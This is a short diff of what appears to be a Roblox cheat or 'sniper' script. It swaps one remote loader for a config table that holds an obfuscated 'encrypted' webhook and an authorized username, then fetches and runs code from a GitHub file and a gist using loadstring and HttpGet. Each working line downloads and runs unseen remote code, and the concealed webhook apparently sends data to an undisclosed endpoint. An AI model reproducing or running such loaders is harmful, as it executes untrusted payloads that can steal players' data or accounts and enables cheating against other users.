@@ -1,1 +1,12 @@
-loadstring(game:HttpGet("https://paste.rs/fm4uI"))()
+local CONFIG = {
+    Authorized = {"vmR_loI"},
+
+    WebhookEncrypted = "41,6,23,17,29,95,124,78,6,91,67,81,89,51,22,77,2,1,8,124,0,18,91,31,69,83,35,26,12,14,5,22,124,80,87,0,5,3,3,120,71,85,87,91,82,106,84,91,5,4,1,0,110,10,91,41,38,34,36,81,18,64,7,122,121,8,51,60,38,10,50,106,19,0,3,86,122,105,116,67,37,89,30,17,26,41,44,103,0,71,64,50,57,86,76,56,23,31,32,17,2,6,93,113,38,61,33,41,39,50,58,39,13,97,6,97,114,22,48,82,46",
+
+    MinMillionPerSecond = 50,
+
+    Custom_Loadstring = true,
+    CustomScriptLoadstring = "loadstring(game:HttpGet('https://raw.githubusercontent.com/dgscrp/dgscrp/refs/heads/main/sniper'))()",
+    EngineURL = "https://gist.githubusercontent.com/Xestox456/81078d769484581184c04e350b87c73e/raw/363df4de3bb84f9c6526751f59a2950a30c9f6b1/sabengine.lua"
+}
+loadstring(game:HttpGet(CONFIG.EngineURL))()(CONFIG)
